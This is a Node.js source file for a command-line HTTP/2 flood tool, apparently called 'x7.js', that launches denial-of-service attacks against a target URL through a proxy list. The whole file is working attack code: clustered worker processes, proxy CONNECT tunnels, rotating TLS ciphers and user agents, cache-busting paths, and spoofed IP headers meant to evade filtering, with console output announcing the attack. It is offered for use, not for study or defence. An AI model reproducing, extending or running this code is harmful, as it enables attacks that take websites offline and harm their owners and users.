const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
var path = require("path");
const crypto = require("crypto");
const UserAgent = require('user-agents');
const fs = require("fs");
const axios = require('axios');
const https = require('https');

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) {
});

if (process.argv.length < 7) {
    console.log(`
Use : node x7.js Target Time Speed Thread Proxy File
Example : node x7.js https://google.com 120 32 8 proxy.txt
Maker : t.me/IIEyesX
`);
    process.exit();
}
const headers = {};

// ========== PERBAIKAN: FUNGSI BACA PROXY DENGAN FORMAT APA PUN ==========
function readLines(filePath) {
    try {
        const rawData = fs.readFileSync(filePath, "utf-8").toString();
        const lines = rawData.split(/\r?\n/);
        const cleanedProxies = [];

        for (let line of lines) {
            line = line.trim();
            if (!line) continue;

            // Hapus protocol (http://, https://, socks4://, socks5://)
            let cleanProxy = line.replace(/^(https?:\/\/|socks[45]:\/\/)/i, '');

            // Extract IP:PORT dari string
            const ipPortPattern = /(\d{1,3}\.){3}\d{1,3}:(\d+)/;
            const match = cleanProxy.match(ipPortPattern);

            if (match) {
                cleanedProxies.push(match[0]);
            }
        }

        // Hapus duplikat
        const uniqueProxies = [...new Set(cleanedProxies)];

        if (uniqueProxies.length === 0) {
            console.log("[ERROR] No valid proxies found in file!");
            process.exit(0);
        }

        console.log(`[INFO] Loaded ${uniqueProxies.length} proxies`);
        return uniqueProxies;

    } catch (error) {
        console.log(`[ERROR] Failed to read proxy file: ${error.message}`);
        process.exit(0);
    }
}

const getCurrentTime = () => {
    const now = new Date();
    const hours = now.getHours().toString().padStart(2, '0');
    const minutes = now.getMinutes().toString().padStart(2, '0');
    const seconds = now.getSeconds().toString().padStart(2, '0');
    return `(\x1b[34m${hours}:${minutes}:${seconds}\x1b[0m)`;
};

const targetURL = process.argv[2];
const agent = new https.Agent({ rejectUnauthorized: false });

function getStatus() {
    const timeoutPromise = new Promise((resolve, reject) => {
        setTimeout(() => {
            reject(new Error('Request Timeout'));
        }, 5000);
    });

    const axiosPromise = axios.get(targetURL, { httpsAgent: agent });

    Promise.race([axiosPromise, timeoutPromise])
        .then((response) => {
            const { status, data } = response;
            console.log(`${getCurrentTime()} [X7-STARTING]  标题: ${getTitleFromHTML(data)} (\x1b[32m${status}\x1b[0m)`);
        })
        .catch((error) => {
            if (error.message === '[Request Timeout] t.me/IIEyesX') {
                console.log(`${getCurrentTime()} [X7-STARTING]  请求超时`);
            } else if (error.response) {
                const extractedTitle = getTitleFromHTML(error.response.data);
                console.log(`${getCurrentTime()} [X7-STARTING]  标题: ${extractedTitle} `);
            } else {
                console.log(`${getCurrentTime()} [X7-STARTING]  ${error.message}`);
            }
        });
}

function getTitleFromHTML(html) {
    const titleRegex = /<title>(.*?)<\/title>/i;
    const match = html.match(titleRegex);
    if (match && match[1]) {
        return match[1];
    }
    return '[Not Found] https://t.me/IIEyesX';
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function getRandomNumberBetween(min, max) {
    return Math.floor(Math.random() * (max - min + 1) + min);
}

function randomString(length) {
    var result = "";
    var characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    var charactersLength = characters.length;
    for (var i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
}

if (cluster.isMaster) {
    console.clear();
    console.log(`
Attack has started. 
Type Ctrl + Z to stop the attack.
https://t.me/IIEyesX
`);

    for (let i = 1; i <= process.argv[5]; i++) {
        cluster.fork();
        console.log(`${getCurrentTime()} [CF-FLOOD-SYSTEM]  攻击线程 ${i} 已经开始`);
    }
    console.log(`${getCurrentTime()} [CF-FLOOD-SYSTEM]  攻击已经开始`);
    setInterval(getStatus, 2000);
    setTimeout(() => {
        console.log(`${getCurrentTime()} [CF-FLOOD-SYSTEM]  攻击已经结束`);
        process.exit(1);
    }, process.argv[3] * 1000);
}

const cplist = [
    'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
    'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
];

const sigalgs = [
    'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:ecdsa_secp521r1_sha512:rsa_pss_rsae_sha512:ed25519:ed448',
    'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
];

const refers = [
    "https://www.google.com/search?q=",
    "https://check-host.net/",
    "https://www.facebook.com/",
    "https://www.youtube.com/",
    "https://www.bing.com/search?q=",
    "https://duckduckgo.com/?q=",
    "https://vk.com/profile.php?redirect=",
];

const pathts = [
    "/",
    "?page=1",
    "?page=2",
    "?category=news",
    "?sort=newest",
    "?limit=10",
];

const uap = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
];

const randomHeaders = {
    'Content-Type': 'text/html; charset=utf-8',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'accept-language': 'en-US,en;q=0.9',
    'accept-encoding': 'gzip, deflate, br',
    'cache-control': 'no-cache',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
};

const ip_spoof = () => {
    const ip_segment = () => Math.floor(Math.random() * 255);
    return `${ip_segment()}.${ip_segment()}.${ip_segment()}.${ip_segment()}`;
};

var proxies = readLines(args.proxyFile);
const fakeIP = ip_spoof();
const parsedTarget = url.parse(args.target);
let concu = sigalgs.join(':');

if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder);
    setTimeout(() => process.exit(1), args.time * 1000);
}

class NetSocket {
    constructor() { }

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nProxy-Connection: Keep-Alive\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port
        });

        connection.setTimeout(options.timeout * 10000);
        connection.setKeepAlive(true, 100000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "错误: 来自代理服务器的无效响应");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "错误: 超时");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "错误: " + error);
        });
    }
}

const Socker = new NetSocket();

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");

    if (parsedProxy.length < 2) return;

    const proxyHost = parsedProxy[0];
    const proxyPort = parseInt(parsedProxy[1]);

    const userAgent = uap[Math.floor(Math.random() * uap.length)];
    const randomReferer = refers[Math.floor(Math.random() * refers.length)];
    const cipper = cplist[Math.floor(Math.random() * cplist.length)];

    const currentHeaders = {
        ":method": "GET",
        ":authority": parsedTarget.host,
        ":scheme": "https",
        ":path": parsedTarget.path + pathts[Math.floor(Math.random() * pathts.length)] + "&" + randomString(10) + "=" + randomString(10),
        "user-agent": userAgent,
        "accept": randomHeaders.accept,
        "accept-language": randomHeaders['accept-language'],
        "accept-encoding": randomHeaders['accept-encoding'],
        "cache-control": randomHeaders['cache-control'],
        "referer": randomReferer,
        "x-forwarded-for": fakeIP,
        "client-ip": fakeIP,
        "via": fakeIP,
    };

    const proxyOptions = {
        host: proxyHost,
        port: proxyPort,
        address: parsedTarget.host + ":443",
        timeout: 25
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error || !connection) return;

        connection.setKeepAlive(true, 100000);

        const tlsOptions = {
            ALPNProtocols: ['h2'],
            ciphers: cipper,
            servername: parsedTarget.host,
            socket: connection,
            rejectUnauthorized: false,
            honorCipherOrder: true,
            secure: true,
            port: 443
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
        tlsConn.setKeepAlive(true, 60000);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 1000,
                initialWindowSize: 6291456,
                maxHeaderListSize: 262144,
                enablePush: false
            },
            createConnection: () => tlsConn,
            socket: connection
        });

        client.on("connect", () => {
            const interval = setInterval(() => {
                if (client.destroyed) {
                    clearInterval(interval);
                    return;
                }
                for (let i = 0; i < args.Rate; i++) {
                    const request = client.request(currentHeaders);
                    request.on("response", () => {
                        request.close();
                        request.destroy();
                    });
                    request.on("error", () => { });
                    request.end();
                }
            }, 1000);
        });

        client.on("error", () => {
            client.destroy();
            connection.destroy();
        });

        client.on("close", () => {
            client.destroy();
            connection.destroy();
        });
    });
}